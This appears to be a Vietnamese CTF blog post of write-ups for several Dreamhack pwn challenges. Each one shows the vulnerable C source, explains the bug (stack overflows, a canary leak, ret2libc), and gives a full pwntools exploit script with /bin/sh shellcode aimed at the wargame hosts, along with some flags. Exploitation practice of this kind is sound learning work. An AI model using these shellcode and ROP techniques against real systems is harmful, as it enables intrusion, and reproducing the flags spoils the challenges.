---
title: Dreamhack
published: 2024-07-25
category: "CTF"
tags: [PWN, CTF]
---

# [Welcome](https://dreamhack.io/wargame/challenges/27)
- Kết nối đến server và có flag
>  ***DH{5cc72596cba7104569abb37f71b8ccf3}***

# [shell_basic](https://dreamhack.io/wargame/challenges/410)
- Để tạo shell đọc tệp `/home/shell_basic/flag_name_is_loooooong` thì ta dùng các lệnh `open, read, write` nhưng tên tệp dài 40 byte nên ta chia tên thành 5 phần đưa lần lượt vào stack theo chiều ngược lại và gán thanh ghi tham số cho `rsp`
- `shellcraft` sẽ cung cấp các hàm shellcode có sẵn và chỉ việc đưa tham số thích hợp vào 
### Script
```python=
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
p = remote('host3.dreamhack.games', 22611)

#p = process('./shell_basic')

path = "/home/shell_basic/flag_name_is_loooooong"

payload = shellcraft.open(path)
payload += shellcraft.read('rax', 'rsp', 100)
payload += shellcraft.write(1, 'rsp', 100)
input()
p.sendlineafter(b'shellcode: ', asm(payload))

p.interactive()
```
> ***DH{ca562d7cf1db6c55cb11c4ec350a3c0b}***

# [basic_exploitation_000](https://dreamhack.io/wargame/challenges/2)
```c 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}
```
- Biến `buf` chỉ khai báo 0x80 byte nhưng cho phép nhập vào 141 byte nên có lỗi `buffer overflow`
- Đề in ra địa chỉ của `buf` và chế độ bảo vệ thực thi bị tắt nên ta đưa shellcode chiếm `/bin/sh` vào `buf` sau đó đưa địa chỉ trả về là địa chỉ của `buf`
- Vì là kiến trúc 32 bit nên các tham số sẽ được đưa vào lần lượt các thanh ghi `ebx, ecx, edx, esi, edi`
### Script
```python=
#!/usr/bin/python3

from pwn import *

#p = process('./basic_exploitation_000')
context.arch = 'i386'
p = remote('host3.dreamhack.games', 12797)

payload  = asm('''
        xor eax, eax
        push 0x68732f
        push 0x6e69622f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        mov al, 0x8
        inc al
        inc al
        inc al
        int 0x80
''')

payload = payload.ljust(132, b'a')

p.recvuntil('buf = (')

buf = int(p.recv(10),16)
log.info(buf)
p.recvline()

payload += p32(buf)

p.sendline(payload)
p.interactive()
```

> ***DH{465dd453b2a25a26a847a93d3695676d}***

# [basic_exploitation_001](https://dreamhack.io/wargame/challenges/3)
```c 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    gets(buf);

    return 0;
}
```
- Nhìn vào code ta thấy biến `buf` khai báo 0x80 = 128 byte nhưng dùng hàm `gets` để nhập vào không giới hạn nên có lỗi `buffer overflow`
- Có hàm dùng để đọc flag là `read_flag` nên ta ghi đè địa chỉ hàm này vào địa chỉ trả về của hàm `main`

### Script
```python=
#!/usr/bin/python3

from pwn import *

p = remote('host3.dreamhack.games', 22411)

context.arch = 'i386'

read_flag = 0x80485b9
ofset = 132

payload = b'A'*ofset
payload += p32(read_flag)

p.sendline(payload)
p.interactive() 
```

# [Return Address Overwrite](https://dreamhack.io/wargame/challenges/351)

```c
#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```
- Ghi đè địa chỉ hàm `get_shell` để lấy được shell và đọc flag
### Script
```python=
#!/usr/bin/python3

from pwn import *

p = remote('host3.dreamhack.games', 17894)

get_shell = 0x4006aa

payload = b'A'*56
payload += p64(get_shell)

p.sendline(payload)
p.interactive()
```
> ***DH{5f47cd0e441bdc6ce8bf6b8a3a0608dc}***

# [Return to Shellcode](https://dreamhack.io/wargame/challenges/352)
```c 
#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```
- Nhận thấy lỗi `buffer overflow` ở hàm `read` và `gets` của biến `buf` 
- Đề cho biết địa chỉ của biến `buf` nên thuận tiện để ta đưa shellcode vào biến `buf` và ghi đè địa chỉ trả về thành địa chỉ của biến `buf` để thực thi shellcode và chiếm shell
- Nhưng Canary được bật nên không thể ghi đè nếu làm thay đổi giá trị canary
- Đề cũng gợi ý là leak canary 
- canary nằm sau biến `buf` và trước rbp
- Để leak được canary cần ghi 89 byte và may mắn khi byte cuối của canary là null nên khi leak sẽ lấy 7 byte sau và không làm thay đổi giá trị canary
### Script
```python=
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

#p = process('./r2s')
p = remote('host3.dreamhack.games', 19838)
p.recvuntil(b'Address of the buf: ')

buf = int(p.recvline(), 16)
log.info(hex(buf))

shell = asm('''
	mov rdi, 29400045130965551
	push rdi
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 0x3b
	syscall
''')

payload = b'A'*89
#input()
p.sendafter(b'Input: ', payload)
p.recvuntil(b'A'*89)
canary = u64(b'\x00' + p.recv(7))
log.info(hex(canary))

payload = shell
payload = payload.ljust(88, b'a')
payload += p64(canary)
payload += b'a'*8
payload += p64(buf)

p.sendlineafter(b'Input: ', payload)
p.interactive()
```
> ***DH{333eb89c9d2615dd8942ece08c1d34d5}***

# [basic_rop_x86](https://dreamhack.io/wargame/challenges/30)
```c 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```
- Lỗi BOF ở hàm read
- Challenge cho ta file libc nên ta cần leak địa chỉ libc để gọi hàm `system(/bin/sh)` trong libc để chiếm shell
- xem các hàm có trong file thực thi
- Để leak địa chỉ libc thì cần leak địa chỉ của `puts` 
- Dùng `puts@plt` để in ra địa chỉ `puts@got` sau đó trừ địa chỉ `puts` trong libc sẽ ra địa chỉ cơ sở của libc
- Sau đó quay lại hàm `main` và nhập tiếp lần 2 và đưa lệnh `system` trong libc với tham số `/bin/sh` để chiếm shell và đọc flag
### Script 
```python=
#!/usr/bin/python3

from pwn import *

exe = ELF('./basic_rop_x86',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

pop_ebx = 0x080483d9

#p = process(exe.path)
p = remote('host1.dreamhack.games', 16486)

payload = b'A'*72
payload += p32(exe.plt['puts'])
payload += p32(exe.sym['main'])
payload += p32(exe.got['puts'])

#input()
p.send(payload)

p.recvuntil(b'A'*64)
puts_leak = u32(p.recv(4))
libc.address = puts_leak - libc.sym['puts']
log.info(hex(puts_leak))
log.info(hex(libc.address))

payload = b'A'*72
payload += p32(libc.sym['system']) 
payload += p32(pop_ebx)
payload += p32(next(libc.search(b'/bin/sh')))

p.sendline(payload)

p.interactive()
```
# 